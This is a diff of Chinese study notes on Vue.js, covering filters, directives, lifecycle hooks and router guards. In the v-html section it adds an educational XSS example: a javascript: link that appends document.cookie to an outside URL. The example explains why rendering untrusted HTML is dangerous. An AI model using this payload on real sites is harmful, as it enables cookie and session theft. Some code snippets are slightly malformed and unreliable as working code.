@@ -612,6 +612,7 @@ key的作用可以理解为就是给节点做一个标识，相当于人类社�
 
 > v-model的三个修饰符：
 > lazy：失去焦点再收集数据；number：输入字符串转为有效的数字；trim：输入首尾空格过滤
+> 通过 JSON.stringify() 把 JavaScript 对象转换为字符串。
 
 ### 过渡&动画
 
@@ -619,10 +620,20 @@ key的作用可以理解为就是给节点做一个标识，相当于人类社�
 ### 过滤器
 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
 语法：
-  1.注册过滤器：```Vue.filter(name,callback)``` 或 ```new Vue{filters:{}}```
-  2.使用过滤器：```{{ xxx | 过滤器名}}``` 或 ```v-bind:属性 = ”xxx｜过滤器名“```
+1.注册过滤器：全局过滤器```Vue.filter(name,callback)``` 或 局部过滤器```new Vue{filters:{}}```
+2.使用过滤器：```{{ xxx | 过滤器名}}``` 或 ```v-bind:属性 = ”xxx｜过滤器名“```
 
-过滤器也可以接收额外参数，多个过滤器也可以串联；而且过滤器并没有改变原本的数据，只是产生新的对应的数据。
+过滤器也可以接收额外参数，如
+```html
+<h3> 现在是：{{time | timeFormater('YYYY_MM_DD')}}</h3>
+```
+```javascript
+    timeFormater(value,str='YYYY年MM月DD日' HH：mm：ss'){
+        return  dayjs(value).format(str)
+    }
+```
+
+多个过滤器可以串联；而且过滤器并没有改变原本的数据，只是产生新的对应的数据。
 
 ### 内置指令与自定义指令
 #### 内置指令
@@ -638,12 +649,29 @@ v-show：条件渲染（动态控制节点是否展示）
 （二）
 v-text：向其所在的节点中渲染文本内容。与插值语法```{{xx}}```的区别在于v-text会替换掉节点中的内容，```{{xx}}```则不会。
 
-v-html：向指定节点中渲染包含html结构的内容。与插值语法```{{xx}}```的区别在于v-model会替换掉节点中 **所有** 的内容，```{{xx}}```则不会；且v-html可以识别html结构。
-**特别注意：<span style='color:red'>v-html有安全性问题！1.在网站上动态渲染任意html都是非常危险的，容易导致xss攻击；2.一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用！</span>**
+v-html：向指定节点中渲染包含html结构的内容。与插值语法```{{xx}}```的区别在于v-html会替换掉节点中 **所有** 的内容，```{{xx}}```则不会；且v-html可以识别html结构。
+**特别注意：<span style='color:red'>v-html有安全性问题！1.在网站上动态渲染任意html都是非常危险的，容易导致xss攻击；2.一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用！</span>**比如非法拿取cookie等操作。cookie简略图示如下：
+![cookie1](cookie.png)
+![cookie2](cookie.png)
+在浏览器中的Application/储存空间/存储中可以查看cookie，右键条目可以进行添加删除等操作。Chrome的插件"Cookie-Editor"可以让对cookie的操作更加方便。
+在html文件中，如果使用了v-html，进行下列操作就可以简单的拿到其他浏览器的cookie：
+```html
+<div id="root">
+    <div v-html="str"></div>
+</div>
+```
+```javascript
+new Vue{
+    el:'#root',
+    data:{
+         str:'<a      	href=javascript:location.href="http://www.baidu.com?"+document.cookie>快点击我！你的cookie要被拿走啦！'
+    }
+}
+```
 
 v-cloak（没有值）：本质上是一个特殊属性，Vue实例创建完毕并接管容器后会删掉v-cloak属性。使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
 
-v-once：v-once所在节点在初次被动态渲染后就视为静态内容了。以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+v-once（没有值）（只会执行一次）：v-once所在节点在初次被动态渲染后就视为静态内容了。以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
 
 v-pre：跳过其所在节点的编译过程。可利用它跳过没有使用指令语法、没有使用插值语法的节点，会加快编译。
 
@@ -665,11 +693,12 @@ v-pre：跳过其所在节点的编译过程。可利用它跳过没有使用指
 
 + 配置对象中常用的3个回调：
   1. ```.bind```：指令与元素成功绑定时调用。
-  2. ```.inserted```：指令所在元素被插入页面时调用。
+  2. ```.inserted```：指令所在元素被插入页面时调用。（比如获取焦点就在此处）
   3. ```.update```：指令所在模版结构被重新解析时调用。
 + 注意：
   1. 指令定义时不加v-，但使用时要加v-；
   2. 指令名如果是多个单词，要使用kebab-case命名方式，不要使用camelCase命名。
+  3. 如果不使用回调，指令会在两种时刻执行：1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时。
 
 ### 插件
 用于增强Vue。本质是包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
@@ -729,9 +758,9 @@ v-pre：跳过其所在节点的编译过程。可利用它跳过没有使用指
 
 ### 常用的生命周期钩子
 1. mounted：Vue完成模板的解析并把 **初始的真实DOM元素** 放入页面（挂载完毕）后调用。在vm的工作过程中mounted只会被调用一次。
-    发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
-2. beforeDestroy：当```vm.$destroy()```调用时调用此生命周期函数（虽然很少调，让张三自鲨不太好）。此时，vm中所有的data、methods、指令等都处于可用状态，马上要执行销毁过程。但 **此时对数据的修改不会再触发更新。
-    清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】
+    用于发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
+2. beforeDestroy：当```vm.$destroy()```调用时调用此生命周期函数（虽然很少调，让张三自鲨不太好）。此时，vm中所有的data、methods、指令等都处于可用状态，马上要执行销毁过程。但 **此时对数据的修改不会再触发更新。**
+    用于清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
 
 
 ## Vue组件化
@@ -1272,8 +1301,8 @@ routes:[
 通过路径后添加问号的方式携带参数，多组key-value之间用```&```分隔。
 
 1. 传递参数
-注意router-link里的<span style='color:red>'```to```前面要加冒号！</span>否则就会把里面传的东西全当字符串处理。
-在使用to的字符串写法时，加了冒号就会把双引号内的东西当作JS去解析，但是还需要一个模板字符串标志"` `"括起来。此外，模板字符串里面混入的JS变量需要用```${xxx}```括起来。
+注意router-link里的<span style='color:red'>```to```前面要加冒号！</span>否则就会把里面传的东西全当字符串处理。
+在使用to的字符串写法时，加了冒号就会把双引号内的东西当作JS去解析，但是还需要一个模板字符串标志```` ```括起来。此外，模板字符串里面混入的JS变量需要用```${xxx}```括起来。
 ```html
 <!-- 跳转并携带query参数，to的字符串写法 -->
 <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">显示{{m.title}}</router-link>
@@ -1387,13 +1416,75 @@ props({query:{id,title}}){
 }
 ```
 
-
 ### 编程式路由导航
 
+### 路由守卫
+作用：对路由进行权限控制
+分类：全局守卫、独享守卫、组件内守卫
 
+#### 全局守卫
+全局前置守卫：初始化时执行+每次路由切换前执行
+```javascript
+router.beforeEach((to,from,next)=>{
+    console.log('beforeEach',to,from)
+    if(to.meta.isAuth){  // 判断当前路由是否需要 进行 权限控制
+        if(localStorage.getItem('school') === 'BUT'){ // 权限控制的具体规则
+            next()  // 放行
+        }else{
+            alert('暂无权限查看')
+            // next ({name:'张三'})
+        }
+    }else{
+        next()  // 放行
+    }
+})
+```
 
+全局后置守卫：初始化时执行+每次路由切换后执行
+```javascript
+router.afterEach((to,from)=>{
+    console.log('afterEach',to,from)
+    if(to.meta.title){  
+        document.title = to.meta.title // 修改网页的title
+    }else{
+        document.title = 'test'
+    }
+})
+```
 
+#### 独享守卫
+```javascript
+beforeEnter((to,from,next)=>{
+    console.log('beforeEnter',to,from)
+    if(to.meta.isAuth){  // 判断当前路由是否需要进行权限控制
+        if(localStorage.getItem('school') === 'BUT'){ // 权限控制的具体规则
+            next()  // 放行
+        }else{
+            alert('暂无权限查看')
+            // next ({name:'张三'})
+        }
+    }else{
+        next()  // 放行
+    }
+})
+```
 
+#### 组件内守卫
+进入守卫：通过路由规则，进入该组件时被调用，```beforeRouteEnter(to,from,next){ }```
+离开守卫：通过路由规则，离开该组件时被调用，```beforeRouteLeave(to,from,next){ }```
+
+## 实践
+1. 组件化编码流程
+    1. 拆分静态组件：组件要按照功能点划分，命名不要与html元素冲突。
+    2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用还是一堆组件在用：
+        + 一个组件在用：放在组件自身即可。
+        + 一堆组件在用：放在它们共同的父组件上（**状态提升**）
+    3. 实现交互：从绑定事件开始。
+2. props适用于：
+    1. 父组件==>子组件 通信
+    2. 子组件==>父组件 通信（不过要求父先给子一个函数）
+3. 使用v-model时切记：<span style="color:red">v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</span>
+4. props传过来的如果是对象类别的值，修改对象中的属性时vue不会报错，但不推荐这样做。
 
 ## Element UI
 一个基于Vue框架的PC端UI组件库。官网：https://element.eleme.cn/#/zh-CN 。
